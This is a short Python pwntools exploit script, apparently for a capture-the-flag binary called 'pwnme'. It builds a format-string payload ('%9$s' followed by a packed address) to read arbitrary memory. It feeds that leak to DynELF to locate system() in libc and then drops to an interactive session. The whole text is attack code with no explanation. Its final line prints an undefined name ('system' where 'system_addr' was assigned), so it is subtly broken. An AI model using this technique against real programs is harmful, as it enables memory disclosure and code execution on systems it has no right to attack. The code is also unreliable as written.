from pwn import *
context(log_level="debug")

p = process("./pwnme")
# gdb.attach(p,"b*0x400ADE\nc")
def leak(addr):
	p.recvuntil(": \n")
	payload = "%9$swint"+p64(addr)
	# print len(payload)
	p.sendline(payload)
	p.recvuntil(": \n")
	p.sendline("a")
	p.recvuntil(">")
	p.sendline('1')
	data = p.recvuntil("wint")[:-4].ljust(4,'\x00')
	# print p.recvuntil("wint")
	p.recvuntil(">")
	p.sendline('2')
	log.debug("%#x => %s" % (addr, (data or '').encode('hex')))
	return data
# print hex(ret_addr(0x4010f9))
# main = 0x400D96
d = DynELF(leak, elf=ELF('./pwnme'))
system_addr = d.lookup('system','libc')
# leak(0x400D96)
print hex(system)
p.interactive()